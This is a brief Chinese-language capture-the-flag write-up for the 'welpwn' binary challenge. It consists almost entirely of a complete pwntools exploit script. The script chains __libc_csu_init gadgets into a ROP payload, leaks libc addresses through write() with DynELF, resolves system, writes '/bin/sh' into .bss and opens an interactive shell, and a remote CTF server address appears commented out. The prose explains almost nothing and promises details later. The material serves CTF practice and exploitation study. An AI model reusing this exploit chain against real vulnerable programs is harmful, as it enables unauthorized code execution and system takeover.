# welpwn - DynELF，\_\_libc_csu_init()函数中的通用Gadgets 

涉及到了连续栈，pwn.DynELF模块的使用，\_\_libc_csu_init()函数的万能通用Gadgets  

明天再详写。  

Exp:
```python
# /usr/bin/python3
# -.- coding=UTF-8 -.-

from pwn import *
context(log_level='debug',arch='amd64',os='linux')
#r = remote("111.198.29.45",48359)
r = process('./welpwn')
elf=ELF('./welpwn')

# __libc_csu_init()
pop4_addr = 0x40089c  # 跳过echo
pop6_addr = 0x40089a  # pop rbx,rbp,r12,r13,r14,r15;ret;
rop2_addr = 0x400880  # mov rdx,r15 ; mov rdi, r14 ; mov edi,r13 ; ...
pop_rdi   = 0x4008a3  # pop rdi ; ret

start_addr = elf.sym['_start']
write_got = elf.got['write']
bss_addr = elf.bss()
read_got = elf.got['read']


def leak(address):
    r.recv() #先接收一次
    payload = b"A"*24 #junk
    payload += p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)    # pop使rbx为0，rbp为1，是由于程序本身的原因
    payload += p64(address)+p64(1)  # 通过write函数泄露 pop r14,r15;
    payload += p64(rop2_addr)   # write(1,address,8)
    payload += b"A"*56+p64(start_addr)   # start调整栈帧
    payload = payload.ljust(1024,b"B")    # 回到main函数
    r.send(payload)
    data = r.recv(8)
    log.info("%# x => %s " % (address,(data or '')))
    return data

dyn = DynELF(leak,elf=ELF('./welpwn'))
system_addr = dyn.lookup('system','libc')

#写入/bin/sh
payload1 = b"A"*24
payload1 += p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)
payload1 += p64(bss_addr)+p64(0) #read(0,bss_addr,8)
payload1 += p64(rop2_addr) 
payload1 += b"A"*56 + p64(pop_rdi) + p64(bss_addr) + p64(system_addr)+p64(0) # 执行system('bss_addr')
payload1 = payload1.ljust(1024,b"B")

r.send(payload1)
r.sendline(b"/bin/sh")#把'/bin/sh'写到bss_addr
r.interactive()
```

参考文章：https://www.freesion.com/article/7350361593/#DynELF_69